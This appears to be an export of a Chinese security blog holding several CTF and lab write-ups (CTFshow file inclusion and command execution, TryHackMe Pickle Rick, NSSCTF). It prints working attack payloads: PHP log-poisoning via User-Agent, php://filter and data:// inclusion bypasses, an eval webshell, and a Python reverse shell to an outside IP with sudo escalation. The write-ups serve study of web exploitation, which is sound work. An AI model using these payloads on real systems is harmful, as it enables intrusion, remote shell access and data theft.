<p>首先在User-Agent中写入我们需要执行的命令，然后相关请求就会存放于日志文件中，然后对该日志文件进行文件包含操作，就可以成功getshell了，当然直接写入一句话木马也是可以的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent:&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br><span class="line">User-Agent:&lt;?php system(&#x27;cat fl0g.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
<h2 id="web81">web81</h2>
<h3 id="源码-4">源码</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-4">payload</h3>
<p>本题仅禁用了:，对于上一题的日志写入没有过滤，仍然可以使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent:&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br><span class="line">User-Agent:&lt;?php system(&#x27;cat fl0g.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
<h2 id="web82">web82</h2>
<h2 id="web83">web83</h2>
<h2 id="web84">web84</h2>
<h2 id="web85">web85</h2>
<h2 id="web86">web86</h2>
<p>以上这些全部归属于条件竞争</p>
<p>脚本一直报毒，就不放了</p>
<h2 id="web87">web87</h2>
<h3 id="源码-5">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-5">payload</h3>
<p>这边先来看一下<code>file_put_contents</code> 是一个 PHP 函数，用于将一个字符串写入文件。它提供了一种简单的方法，可以直接将字符串内容写入文件中，而无需使用多个函数来打开、写入和关闭文件。</p>
<p>基本的语法如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(filename, data, mode, context);</span><br></pre></td></tr></table></figure>
<p>其中：</p>
<ul>
<li><code>filename</code> 是要写入的目标文件的文件名，可以包含路径信息。</li>
<li><code>data</code> 是要写入文件的字符串数据。</li>
<li><code>mode</code> 是一个可选参数，表示文件写入的模式。默认是 <code>0</code>，表示没有特殊处理。你可以使用 <code>FILE_APPEND</code> 来在文件末尾追加内容，如果文件不存在，则会创建新文件。</li>
<li><code>context</code> 是一个可选参数，表示上下文资源，通常在需要自定义流上下文的情况下使用。</li>
</ul>
<p><strong>get参数</strong></p>
<p>get请求的参数file会经过urldecode参数的处理，所以在传入的时候需要经过二次编码</p>
<p><strong>原始</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/write=convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure>
<p><strong>二次编码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?filespan><br></pre></td></tr></table></figure>
<p><strong>post参数</strong></p>
<p>p神的文章里详细的写了有关死亡exit的绕过方式</p>
<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用 | 离别歌 (leavesongs.com)</a></p>
<p>这边使用的是直接命令执行，当然也可以选择使用一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;ls&#x27;);</span><br><span class="line">base64 编码：</span><br><span class="line">PD9waHAgc3lzdGVtKCdscycpOw==</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;cat fl0g.php&#x27;);</span><br><span class="line">base64 编码：</span><br><span class="line">PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs=</span><br></pre></td></tr></table></figure>
<p>最终传入的需要添加两个字符在最前面，因为base64的解码规则是4byte一组，而phpdie仅有六个字母</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">content=aaPD9waHAgc3lzdGVtKCdscycpOw==</span><br><span class="line">content=aaPD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs=</span><br></pre></td></tr></table></figure>
<h2 id="web88">web88</h2>
<h3 id="源码-6">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-6">payload</h3>
<p>利用data协议的base编码来进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;tac f*.php&#x27;);?&gt; </span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZioucGhwJyk7Pz4g</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTFshow</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow-Test_your_nc</title>
    <url>/2024/03/08/CTFshow-Test_your_nc/</url>
    <content><![CDATA[<h1>CTFshow-Test_your_nc</h1>
<h2 id="pwn0">pwn0</h2>
<p>ssh连接，输入密码123456</p>
<p>查找一下得到flag</p>
<p><img src="https://s2.loli.net/2024/03/08/FxsuYgliSHcoT4q.png" alt="ctfshow_testnc_1"></p>
<h2 id="pwn1">pwn1</h2>
<p><img src="https://s2.loli.net/2024/03/08/WMzjcUSNCZdEvPe.png" alt="ctfshow_testnc_2"></p>
<p>ida64位反编译后，可以发现system函数可以直接利用</p>
<p><img src="https://s2.loli.net/2024/03/08/t2X4nvOTwf1EdPV.png" alt="ctfshow_testnc_3"></p>
<h2 id="pwn2">pwn2</h2>
<p><img src="https://s2.loli.net/2024/03/08/A3nYUJ9dlkfvaDh.png" alt="ctfshow_testnc_4"></p>
<p>输入cat命令即可得到flag</p>
<p><img src="https://s2.loli.net/2024/03/08/AFjwL64dIzleqkQ.png" alt="ctfshow_testnc_5"></p>
<h2 id="pwn3">pwn3</h2>
<p><img src="https://s2.loli.net/2024/03/08/DmOhgtk92WQXnqH.png" alt="ctfshow_testnc_6"></p>
<p>在system_func中发现存在system命令，可以获取flag</p>
<p><img src="https://s2.loli.net/2024/03/08/FWBVQaUvY5PAd7b.png" alt="ctfshow_testnc_7"></p>
<h2 id="pwn4">pwn4</h2>
<p><img src="https://s2.loli.net/2024/03/08/ALru1Z9Cf3zHth2.png" alt="ctfshow_testnc_8"></p>
<p>在这里可以发现存在一个字符串比较的逻辑，输入CTFshowPWN作为字符串进行比较，然后可以进行execve_func函数</p>
<p><img src="https://s2.loli.net/2024/03/08/U5rgY49PpQf7uoA.png" alt="ctfshow_testnc_9"></p>
<p>进入后发现已经存在可交互的shell</p>
<p><img src="https://s2.loli.net/2024/03/08/23upfgvCyUK6xQ7.png" alt="ctfshow_testnc_10"></p>
]]></content>
      <categories>
        <category>CTFshow</category>
      </categories>
      <tags>
        <tag>Test_your_nc</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow-信息搜集</title>
    <url>/2023/12/19/CTFshow-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    <content><![CDATA[<h1>CTFshow-信息搜集</h1>
<h2 id="web1">web1</h2>
<p>f12，前端js敏感泄露</p>
<p><img src="https://s2.loli.net/2023/12/19/3wpAmDHNfxPEKC5.png" alt="ctfshow_xinxisouji_1"></p>
<h2 id="web2">web2</h2>
<p>禁止了f12，但仍然可以通过查看源码发方式去发现flag</p>
<p><img src="https://s2.loli.net/2023/12/19/gK3hSrmNvXBjlUt.png" alt="ctfshow_xinxisouji_2"></p>
<h2 id="web3">web3</h2>
<p>flag藏在响应包中</p>
<p><img src="https://s2.loli.net/2023/12/19/OWwmaN8i9KSdCPs.png" alt="ctfshow_xinxisouji_3"></p>
<h2 id="web4">web4</h2>
<p>查看robots.txt泄露信息，访问相应目录得到flag</p>
<p><img src="https://s2.loli.net/2023/12/19/pQaHgDOAEG3YsBf.png" alt="ctfshow_xinxisouji_4"></p>
<h2 id="web5">web5</h2>
<p>存在源码泄露，访问index.phps，下载得到flag</p>
<p><img src="https://s2.loli.net/2023/12/19/QtJiznrYFUC79BE.png" alt="ctfshow_xinxisouji_5"></p>
<h2 id="web6">web6</h2>
<p>同信息泄露，访问www.zip，得到源码的压缩包</p>
<p><img src="https://s2.loli.net/2023/12/19/uxXkLBZlwHhgdMs.png" alt="ctfshow_xinxisouji_6"></p>
<h2 id="web7">web7</h2>
<p>版本控制，明显提示了git泄露</p>
<p>访问.git</p>
<p><img src="https://s2.loli.net/2023/12/19/f9VyPXODWpjYmFQ.png" alt="ctfshow_xinxisouji_7"></p>
<h2 id="web8">web8</h2>
<p>版本控制，跟上一题有所区别，是svn泄露</p>
<p>访问.svn</p>
<p><img src="https://s2.loli.net/2023/12/19/RmQ5zOPCyESpoUw.png" alt="ctfshow_xinxisouji_8"></p>
<h2 id="web9">web9</h2>
<p>提示vim，存在缓存泄露</p>
<p>访问index.php.swp</p>
<p><img src="https://s2.loli.net/2023/12/19/JUEIWPLwMlaTY6A.png" alt="ctfshow_xinxisouji_9"></p>
<h2 id="web10">web10</h2>
<p>直接查看cookie即得到</p>
<p><img src="https://s2.loli.net/2023/12/19/S5qH9XU2pR7AhK1.png" alt="ctfshow_xinxisouji_10"></p>
<h2 id="web11">web11</h2>
<p>考察的是DNS解析相关，刚好填补了知识点的空缺</p>
<p><img src="https://s2.loli.net/2023/12/19/bYNALzscdjB36IC.png" alt="ctfshow_xinxisouji_11"></p>
<h2 id="web12">web12</h2>
<p>主页面地下一串数字，即是密码</p>
<p>访问robots.txt，得到管理员后台路径/admin</p>
<p>然后账号admin，密码372619038</p>
<p>既得flag</p>
<h2 id="web13">web13</h2>
<p>页面下方documents点击</p>
<p><img src="https://s2.loli.net/2023/12/19/mBFd3P1wbSTnE7i.png" alt="ctfshow_xinxisouji_12"></p>
<p>然后发现开发者文档</p>
<p><img src="https://s2.loli.net/2023/12/19/lBcnrqbRNGmzPTC.png" alt="ctfshow_xinxisouji_13"></p>
<p>登录即得flag</p>
<p><img src="https://s2.loli.net/2023/12/19/GbsVhao8P9mkrA5.png" alt="ctfshow_xinxisouji_14"></p>
<h2 id="web14">web14</h2>
<p>存在编辑器</p>
<p><img src="https://s2.loli.net/2023/12/19/DdokiKVFqbNJYsH.png" alt="ctfshow_xinxisouji_15"></p>
<p>文件上传处存在源码泄露</p>
<p><img src="https://s2.loli.net/2023/12/19/o71TQKGNUfObIgZ.png" alt="ctfshow_xinxisouji_16"></p>
<p>然后找到相应的flag文件</p>
<p>访问对应路径/nothinghere/fl000g.txt 得到flag</p>
<h2 id="web15">web15</h2>
<p>扫描发现存在后台/admin</p>
<p>然后根据邮箱进行社工，发现密保答案，重置密码</p>
<p>登录得到flag</p>
<h2 id="web16">web16</h2>
<p>探针默认名称为</p>
<p>tz.php，访问后在phpinfo中找到flag</p>
<p><img src="https://s2.loli.net/2023/12/19/Cg3GD1Awu2ab97M.png" alt="ctfshow_xinxisouji_17"></p>
<p><img src="https://s2.loli.net/2023/12/19/HmRYp3f4cjheEk2.png" alt="ctfshow_xinxisouji_18"></p>
<h2 id="web17">web17</h2>
<p>扫描后发现存在backup.sql泄露</p>
<p>然后在文件中发现flag</p>
<p><img src="https://s2.loli.net/2023/12/19/itj8EzL5TxlUFCJ.png" alt="ctfshow_xinxisouji_19"></p>
<h2 id="web18">web18</h2>
<p>源码中存在敏感信息</p>
<p><img src="https://s2.loli.net/2023/12/19/5Xn4w8eKkVYld7g.png" alt="ctfshow_xinxisouji_20"></p>
<p><img src="https://s2.loli.net/2023/12/19/5Xn4w8eKkVYld7g.png" alt="ctfshow_xinxisouji_20"></p>
<p>解密后访问110.php</p>
<h2 id="web19">web19</h2>
<p>前端加密，参数保存在js中</p>
<p><img src="https://s2.loli.net/2023/12/19/sNkwgWSCDFxVcey.png" alt="ctfshow_xinxisouji_22"></p>
<p>根据源码，aes加密，CBC模式，zeropadding填充</p>
<p>然后解密可得密码</p>
<p><img src="https://s2.loli.net/2023/12/19/bKWAzSZkBwdQsRe.png" alt="ctfshow_xinxisouji_23"></p>
<p>最后进行登录，获得flag</p>
<p><img src="https://s2.loli.net/2023/12/19/j6gUmZuhnMx5ri1.png" alt="ctfshow_xinxisouji_24"></p>
<h2 id="web20">web20</h2>
<p>访问/db/db.mdb</p>
<p>下载库，查找flag</p>
<p><img src="https://s2.loli.net/2023/12/19/9nHjpeWtQJxYvba.png" alt="ctfshow_xinxisouji_25"></p>
<h2 id="总结">总结</h2>
<p>信息泄露问题很普遍，前期的信息搜集很重要，无论是在CTF赛事中，还是在实战。</p>
]]></content>
      <categories>
        <category>CTFshow</category>
      </categories>
      <tags>
        <tag>信息搜集</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSCTF Round-17 Basic-Web</title>
    <url>/2024/02/21/NSSCTF%20Round-17%20Basic-Web/</url>
    <content><![CDATA[<h1>NSSCTF Round-17 Basic-Web</h1>
<h2 id="前言">前言</h2>
<p>一次很难评的周赛，web里藏misc，准确来说藏musc，何必呢？</p>
<h2 id="web">web</h2>
<h3 id="真·签到">真·签到</h3>
<p>查看robots.txt页面可以发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hint:E794A8E688B7E5908DE7869FE68289E590972CE696B0E7949FE8B59BE58FAFE98187E8A781E8BF87E593A67E0AE8AEB0E5BE97E794A8E688B7E5908DE585A8E794A8E5B08FE58699E593A6EFBD9EEFBD9E</span><br><span class="line">username:13 44 21 15 42</span><br><span class="line">password:LF5GY3KZKRVTCT2EM54FUV2FO5GVIVLZJZ5GW6C2IRJGQTT2KU2VUR2GNJNEIYZVLJDVKPI=</span><br></pre></td></tr></table></figure>
<p>解密得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#base16</span><br><span class="line">hint:用户名熟悉吗,新生赛可遇见过哦~</span><br><span class="line">记得用户名全用小写哦～～</span><br><span class="line">#敲击码</span><br><span class="line">username:C(K)TFER-&gt;ctfer</span><br><span class="line">#base32 base64 md5</span><br><span class="line">password:c9fa95881ea0152791d4a759dacd79de(Nss)</span><br></pre></td></tr></table></figure>
<p>登录后查看前端</p>
<p><img src="https://s2.loli.net/2024/02/21/lfz4DquXpoyHBvP.png" alt="NSSCTF Round"></p>
<p>然后是一个弱类型问题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nss&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;nss&#x27;</span>] == <span class="number">732339662</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">assert</span>(<span class="string">&quot;is_numeric(<span class="subst">$_GET</span>[nss])==0&quot;</span>) || <span class="keyword">die</span>(<span class="string">&#x27;oops!此路不通！！&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;这里不是说了吗！！！必须是 732339662 (招新群群号！)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;啊？这是什么新型比较？&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;是不是题错了啊&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>两种思路，分别讲述一下</p>
<p>首先都是先传入数字732339662，过第一个if，然后assert函数，内部为真继续，为假结束</p>
<p>逻辑或||的运算规则是一个为真即为真，后续不再计算，一个为假再计算右边的表达式，但是由于存在die函数，如果前面整体为真即可过，如果为假，后续进入die函数直接结束了。</p>
<p>因此我们可以的办法就是令整体为真，此时如果传入的Nss不是字符串，则is_numeric为假=0，此时左边整体为真。</p>
<p>此时PHP的版本是7.2.34，猜测是这个原因，所以常规的%0a%00绕过均失效，最终可用的来源于,</p>
<p><a href="https://www.bilibili.com/read/cv20228698/">记周赛遇到的一个is_numeric问题 - 哔哩哔哩 (bilibili.com)</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?nss=732339662,1</span><br></pre></td></tr></table></figure>
<p>这是一种解法，还有一种思路值得参考，通过闭合绕过，因为存在die函数会直接结束进程，所以将其闭合即可，并且后面的直接注释掉即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?nss=732339662a;)//</span><br></pre></td></tr></table></figure>
<h3 id="真的是文件上传吗？">真的是文件上传吗？</h3>
<p>先来看一下按照本题预期（应该</p>
<p>最开始页面上是这个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">++++++++[&gt;&gt;++&gt;++++&gt;++++++&gt;++++++++&gt;++++++++++&gt;++++++++++++&gt;++++++++++++++&gt;++++++++++++++++&gt;++++++++++++++++++&gt;++++++++++++++++++++&gt;++++++++++++++++++++++&gt;++++++++++++++++++++++++&gt;++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;-------.&gt;-.++++++.&lt;&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;&gt;++.&lt;++++++++.&gt;---------.++++++.&lt;&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;+++++++.+.+++++.&gt;.&lt;&lt;&lt;-.&lt;&lt;&lt;------.&gt;&gt;&gt;++++++++.&gt;&gt;-----.&gt;++.&lt;----.&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;++++++++.--------.&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;----.&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;+++++.++++++.-----------.++++++.&lt;&lt;&lt;&lt;+....&lt;.&gt;&gt;&gt;------.&gt;&gt;+++++++.----------.&lt;&lt;&lt;&lt;-.&gt;&gt;&gt;&gt;&gt;+++.----------.++++++.&lt;&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;&gt;++.&lt;+++++.+++..&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;----.-------.&gt;-.&lt;.&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;+++++++.+.+++++.&gt;--.&lt;&lt;&lt;&lt;&lt;+.</span><br></pre></td></tr></table></figure>
<p>brainfuck解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You want a hint?</span><br><span class="line">Give me a flag!!!!</span><br><span class="line">And you will hava hint!</span><br></pre></td></tr></table></figure>
<p>然后get传入一个flag参数，即将迎来极其无语的一点，嵌套了n层的base，如果这是misc，我无话可说，但是这个是web，只能说一个6</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>最终得到的提示是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">你所上传的即是命令</span><br></pre></td></tr></table></figure>
<p>看了一眼框架，python的flask，直接读环境</p>
<p><img src="https://s2.loli.net/2024/02/21/n2jT4w5N6gbPhtx.png" alt=""></p>
<p>乐（</p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>NSSCTF Round</tag>
      </tags>
  </entry>
  <entry>
    <title>Tryhackme-easy-Pickle Rick</title>
    <url>/2024/03/13/Tryhackme-easy-Pickle%20Rick/</url>
    <content><![CDATA[<h1>Tryhackme-easy-Pickle Rick</h1>
<h3 id="前言">前言</h3>
<p>一个简单靶场，kali环境有些小问题，这次是windows下做的</p>
<p>A Rick and Morty CTF. Help turn Rick back into a human!</p>
<h3 id="过程">过程</h3>
<p>首先给出一个页面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Listen Morty... I need your help, I&#x27;ve turned myself into a pickle again and this time I can&#x27;t change back!</span><br><span class="line"></span><br><span class="line">I need you to *BURRRP*....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is, I have no idea what the *BURRRRRRRRP*, password was! Help Morty, Help!</span><br></pre></td></tr></table></figure>
<p>很明显提示说使用burpsuite</p>
<p>通过抓包得到一条提示信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Note to self, remember username!</span><br><span class="line">Username: R1ckRul3s</span><br></pre></td></tr></table></figure>
<p>先使用扫描存在的端口，发现存在了两个开放端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2024/2/23 23:27:09    开始扫描...</span><br><span class="line">10.10.242.108:22</span><br><span class="line">10.10.242.108:80</span><br></pre></td></tr></table></figure>
<p>然后来扫一下目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">login.php</span><br><span class="line">robots.txt</span><br></pre></td></tr></table></figure>
<p>在robots.txt下发现存在字符串，当作密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Wubbalubbadubdub</span><br></pre></td></tr></table></figure>
<p>login.php尝试登录，登陆后成功跳转portal.php</p>
<p>存在一个可能是命令执行的窗口，ls后查看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sup3rS3cretPickl3Ingred.txt</span><br><span class="line">assets</span><br><span class="line">clue.txt</span><br><span class="line">denied.php</span><br><span class="line">index.html</span><br><span class="line">login.php</span><br><span class="line">portal.php</span><br><span class="line">robots.txt</span><br></pre></td></tr></table></figure>
<p>访问Sup3rS3cretPickl3Ingred.txt，得到第一个flag</p>
<p>在clue.txt发现一段话</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Look around the file system for the other ingredient.</span><br></pre></td></tr></table></figure>
<p>denied.php禁止访问</p>
<p>开始反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.8.71.162 &quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nlvp 1234</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/02/25/RbVJ34EyWQNHPaT.png" alt=""></p>
<p>成功反弹后进行提权操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
<p>发现当前甚至没有设置基础密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Matching Defaults entries for www-data on ip-10-10-242-108.eu-west-1.compute.internal:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on ip-10-10-242-108.eu-west-1.compute.internal:</span><br><span class="line">    (ALL) NOPASSWD: ALL</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>
<p>成功提权</p>
<p>然后查找相应的两个flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat &quot;second ingredients&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/02/25/tmTeXNpjWKaqfEy.png" alt=""></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat ./3rd.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/02/25/H7wTqBGDkIljEb8.png" alt=""></p>
]]></content>
      <categories>
        <category>Tryhackme</category>
      </categories>
      <tags>
        <tag>Tryhackme</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow-命令执行</title>
    <url>/2024/01/17/CTFshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1>CTFshow-命令执行</h1>
<h2 id="web29">web29</h2>
<h3 id="源码">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload">payload</h3>
<p>简单分析一下，可以看到，危险函数是eval，但是只进行了对flag的过滤，还是比较简单的</p>
<h4 id="方法一">方法一</h4>
<p>比较简单的一个，不考虑过滤，使用eval传一个一句话木马进去，蚁剑连接即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=eval($_POST[1]); </span><br></pre></td></tr></table></figure>
<h4 id="方法三">方法三</h4>
<p>*绕过flag，但是需要在源码中查找flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=system(&quot;cat fl*g.php&quot;);</span><br></pre></td></tr></table></figure>
<h4 id="方法四">方法四</h4>
<p>利用*去匹配文件名的一部分的以及利用cp将文件内容复制到另一文本中</p>
